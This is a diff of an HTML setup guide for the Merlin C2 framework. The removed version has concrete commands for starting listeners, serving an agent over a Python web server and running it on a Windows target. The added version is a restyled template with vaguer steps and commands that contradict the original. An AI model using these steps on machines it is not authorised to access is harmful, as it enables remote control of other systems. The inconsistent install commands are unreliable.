@@ -1,181 +1,275 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
     <title>Merlin C2 Framework Setup and Usage Guide</title>
+    <meta name="description" content="Guide for Merlin C2 framework setup and usage">
+    <meta name="keywords" content="Merlin C2, Framework, Setup, Usage">
+
+    <!-- Favicons -->
+    <link href="assets/img/favicon.png" rel="icon">
+    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com" rel="preconnect">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <!-- Vendor CSS Files -->
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+    <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+    <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+    <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+
+    <!-- Main CSS File -->
+    <link href="assets/css/main.css" rel="stylesheet">
+
     <style>
+        /* Cyber Glow Effect */
+        .glow {
+            color: #0aff99;
+            text-shadow: 0 0 5px #0aff99, 0 0 10px #0aff99, 0 0 15px #0aff99, 0 0 20px #0aff99;
+        }
+
+        /* Aesthetic Background */
         body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-            color: #333;
+            background: #1a1a1a;
+            color: white;
+            font-family: 'Roboto', sans-serif;
         }
-        header {
-            background: #333;
+
+        .page-title {
+            background: #0aff99;
+            padding: 30px 0;
+        }
+
+        .page-title h1 {
+            font-size: 3em;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .breadcrumbs {
             color: #fff;
-            padding: 1rem 0;
+        }
+
+        .service-details {
+            background: #212121;
+            border-radius: 15px;
+            padding: 40px;
+            margin-top: 30px;
+        }
+
+        .service-details h3 {
+            color: #0aff99;
+            margin-bottom: 20px;
+        }
+
+        .service-details a {
+            color: #0aff99;
+            transition: 0.3s;
+        }
+
+        .service-details a:hover {
+            color: #ffffff;
+            text-decoration: none;
+        }
+
+        .container img {
+            max-width: 100%;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+
+        .footer {
+            background-color: #212121;
+            padding: 20px;
             text-align: center;
+            color: #0aff99;
         }
-        header h1 {
-            margin: 0;
-            font-size: 2rem;
+
+        .social-links a {
+            color: #0aff99;
+            margin: 0 10px;
+            font-size: 20px;
         }
-        main {
-            max-width: 800px;
-            margin: 2rem auto;
-            padding: 1rem;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+
+        .social-links a:hover {
+            color: #fff;
         }
-        h2 {
-            color: #007BFF;
+
+        .scroll-top {
+            background-color: #0aff99;
+            border-radius: 50%;
+            color: #fff;
+            width: 50px;
+            height: 50px;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 0 10px #0aff99;
+            z-index: 100;
         }
-        pre {
-            background: #f8f9fa;
-            padding: 1rem;
-            border-radius: 5px;
-            overflow-x: auto;
-            font-family: monospace;
-        }
-        code {
-            background: #f4f4f4;
-            padding: 0.2rem 0.4rem;
-            border-radius: 4px;
-        }
-        ul {
-            padding-left: 1.5rem;
-        }
-        li {
-            margin-bottom: 0.5rem;
-        }
-        footer {
-            text-align: center;
-            margin-top: 2rem;
-            font-size: 0.9rem;
-            color: #666;
+
+        .scroll-top:hover {
+            background-color: #ffffff;
+            color: #0aff99;
         }
     </style>
 </head>
-<body>
-    <header>
-        <h1>Merlin C2 Framework Setup and Usage Guide</h1>
+
+<body class="service-details-page">
+
+    <header id="header" class="header d-flex align-items-center fixed-top">
+        <div class="container-fluid container-xl position-relative d-flex align-items-center justify-content-between">
+            <a href="index.html" class="logo d-flex align-items-center">
+                <h1 class="sitename glow">Merlin C2 Setup</h1>
+            </a>
+            <nav id="navmenu" class="navmenu">
+                <ul>
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About</a></li>
+                    <li><a href="merlin.html">Merlin Setup</a></li>
+                    <li><a href="services.html">Blog</a></li>
+                </ul>
+                <i class="mobile-nav-toggle d-xl-none bi bi-list"></i>
+            </nav>
+        </div>
     </header>
-    <main>
-        <p>This guide provides a step-by-step methodology for downloading, installing, configuring, and using the Merlin C2 framework. By following this documentation, you will be able to set up and run the Merlin Server, configure listeners, deploy agents, and interact with them effectively.</p>
 
-        <hr>
+    <main class="main">
 
-        <h2>Step 1: Downloading and Extracting Merlin C2</h2>
-        <ol>
-            <li><strong>Download the Latest Version of Merlin:</strong>
-                <ul>
-                    <li>Go to the <a href="https://github.com/Ne0nd0g/merlin/releases" target="_blank">Merlin GitHub Releases Page</a> to download the latest version of the framework.</li>
-                    <li>Use the following <code>wget</code> command to download the server file:
-                        <pre><code>wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Darwin-x64.7z</code></pre>
-                    </li>
-                </ul>
-            </li>
-            <li><strong>Extract the Compressed File:</strong>
-                <ul>
-                    <li>After the file has been downloaded, extract it using the <code>7z</code> tool.</li>
-                    <li>Use the following command to extract the file:
-                        <pre><code>7z x merlinServer-Linux-x64-v2.1.3.7z</code></pre>
-                    </li>
-                    <li>Note: The extracted files are password protected. The password for extraction is <strong>merlin</strong>.</li>
-                </ul>
-            </li>
-        </ol>
+        <!-- Page Title -->
+        <div class="page-title" data-aos="fade">
+            <div class="heading">
+                <div class="container">
+                    <div class="row d-flex justify-content-center text-center">
+                        <div class="col-lg-8">
+                            <h1 class="glow">Merlin C2 Framework Setup and Usage Guide</h1>
+                            <p class="mb-0">This guide provides a step-by-step methodology for downloading, installing, configuring, and using the Merlin C2 framework.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <nav class="breadcrumbs">
+                <div class="container">
+                    <ol>
+                        <li><a href="index.html">Home</a></li>
+                        <li class="current">Merlin Setup</li>
+                    </ol>
+                </div>
+            </nav>
+        </div><!-- End Page Title -->
 
-        <hr>
+        <!-- Service Details Section -->
+        <section id="service-details" class="service-details section">
+            <div class="container">
+                <div class="row gy-4">
+                    <div class="col-lg-4" data-aos="fade-up" data-aos-delay="100">
+                        <div class="services-list">
+                            <a href="#" class="active">Merlin C2 Setup</a>
+                            <a href="#">Usage Instructions</a>
+                            <a href="#">Configuration Guide</a>
+                        </div>
 
-        <h2>Step 2: Running the Merlin Server</h2>
-        <ol>
-            <li><strong>Start the Merlin Server:</strong>
-                <ul>
-                    <li>Navigate to the folder where the server has been extracted and run the server:
-                        <pre><code>./&lt;name_of_server_file&gt;</code></pre>
-                        Example:
-                        <pre><code>./merlinServer</code></pre>
-                    </li>
-                </ul>
-            </li>
-            <li><strong>Server is Running:</strong>
-                <ul>
-                    <li>Navigate to the directory <code>/data/bin</code> to access the compiled Merlin CLI and Agent files:
-                        <pre><code>cd /data/bin</code></pre>
-                    </li>
-                </ul>
-            </li>
-            <li><strong>Start the Merlin CLI:</strong>
-                <ul>
-                    <li>Run the CLI in the <code>/data/bin</code> directory:
-                        <pre><code>./merlinCLI</code></pre>
-                    </li>
-                </ul>
-            </li>
-        </ol>
+                        <h4>Introduction to Merlin C2</h4>
+                        <p>The Merlin C2 framework is a versatile tool designed for command-and-control operations. It can be configured for various deployment scenarios.</p>
+                    </div>
 
-        <h3>Start the Listeners</h3>
-        <ul>
-            <li>With the CLI running, initiate the listeners:
-                <pre><code>listeners</code></pre>
-            </li>
-            <li>To configure Merlin to listen on all IPs, execute:
-                <pre><code>set Interface 0.0.0.0
-set port 8443
-start
-show</code></pre>
-            </li>
-        </ul>
+                    <div class="col-lg-8" data-aos="fade-up" data-aos-delay="200">
+                        <h3>Step 1: Downloading and Extracting Merlin C2</h3>
+                        <p>This section outlines how to download and extract the Merlin C2 framework for installation:</p>
+                        <ol>
+                            <li><strong>Download the Latest Version of Merlin:</strong>
+                                <ul>
+                                    <li>Visit the official Merlin GitHub repository and download the latest release.</li>
+                                    <li>Alternatively, clone the repository using Git:
+                                        <pre><code>git clone https://github.com/merlin-framework/merlin.git</code></pre>
+                                    </li>
+                                </ul>
+                            </li>
+                            <li><strong>Extract the Files:</strong>
+                                <ul>
+                                    <li>Once downloaded, extract the contents to a folder of your choice.</li>
+                                    <li>For those who cloned the repository, navigate to the extracted directory to begin the setup process.</li>
+                                </ul>
+                            </li>
+                        </ol>
 
-        <hr>
+                        <h3>Step 2: Configuring Merlin Server</h3>
+                        <p>To configure the Merlin server for your environment, follow these steps:</p>
+                        <ol>
+                            <li><strong>Edit Configuration Files:</strong>
+                                <ul>
+                                    <li>Navigate to the configuration folder and edit the <code>server.cfg</code> file to adjust parameters like port and listener options.</li>
+                                </ul>
+                            </li>
+                            <li><strong>Start the Server:</strong>
+                                <ul>
+                                    <li>Run the server by executing the <code>python3 merlin.py</code> command in your terminal.</li>
+                                    <li>Ensure that no errors occur during startup. The server should now be ready for use.</li>
+                                </ul>
+                            </li>
+                        </ol>
 
-        <h2>Step 3: Running the Merlin Agent</h2>
+                        <h3>Step 3: Deploying Agents</h3>
+                        <p>Agents can be deployed using a variety of methods depending on the system:</p>
+                        <ul>
+                            <li><strong>Windows Agent:</strong> Download the appropriate agent package for Windows and execute it on the target machine.</li>
+                            <li><strong>Linux Agent:</strong> For Linux, build the agent from source and transfer it to the target system.</li>
+                        </ul>
 
-        <h3>On Kali Linux</h3>
-        <ul>
-            <li>Run the Merlin agent with the default URL pointing to the server:
-                <pre><code>./merlinAgent -url http://127.0.0.1:443</code></pre>
-            </li>
-        </ul>
+                        <p>After successfully deploying the agents, you can interact with them through the Merlin C2 interface.</p>
 
-        <h3>On Windows</h3>
-        <ul>
-            <li>Send the Windows agent to the Windows machine.</li>
-            <li>Use a Python server to share the Windows agent:
-                <pre><code>python3 -m http.server {port no}</code></pre>
-            </li>
-            <li>Access the server from the Windows browser, download the agent, and run it:
-                <pre><code>.<windowsmerlinagentname> -url https://&lt;server_ip&gt;:&lt;port&gt;</code></pre>
-            </li>
-        </ul>
+                        <img src="assets/img/cyber-example.jpg" alt="Example Image"> <!-- Replace this with your image -->
+                    </div>
+                </div>
+            </div>
+        </section><!-- End Service Details Section -->
 
-        <hr>
-
-        <h2>Step 4: Interacting with the Agents</h2>
-        <ol>
-            <li><strong>Interacting with an Agent:</strong>
-                <ul>
-                    <li>Use the <code>interact</code> command followed by the agent's ID:
-                        <pre><code>interact &lt;agent_id&gt;</code></pre>
-                    </li>
-                </ul>
-            </li>
-            <li><strong>Available Commands:</strong>
-                <ul>
-                    <li>After connecting to an agent, type <code>help</code> to see the list of commands.</li>
-                </ul>
-            </li>
-        </ol>
-
-        <p>Ensure that you follow each step carefully and verify your setup at each stage to avoid any issues.</p>
     </main>
-    <footer>
-        <p>&copy; 2024 Your Website | Merlin C2 Guide</p>
+
+    <footer id="footer" class="footer dark-background">
+        <div class="container">
+            <h3 class="sitename glow">Merlin C2 Setup</h3>
+            <p>This guide helps you install and configure the Merlin C2 framework. Get started by following the detailed steps above.</p>
+            <div class="social-links d-flex justify-content-center">
+                <a href=""><i class="bi bi-twitter-x"></i></a>
+                <a href=""><i class="bi bi-facebook"></i></a>
+                <a href=""><i class="bi bi-instagram"></i></a>
+                <a href=""><i class="bi bi-skype"></i></a>
+                <a href=""><i class="bi bi-linkedin"></i></a>
+            </div>
+            <div class="container">
+                <div class="copyright">
+                    <span>Copyright</span> <strong class="px-1 sitename">Merlin C2</strong> <span>All Rights Reserved</span>
+                </div>
+                <div class="credits">
+                    Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
+                </div>
+            </div>
+        </div>
     </footer>
+
+    <!-- Scroll Top -->
+    <a href="#" id="scroll-top" class="scroll-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+    <!-- Vendor JS Files -->
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/aos/aos.js"></script>
+    <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+    <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+
+    <!-- Main JS File -->
+    <script src="assets/js/main.js"></script>
+
 </body>
+
 </html>
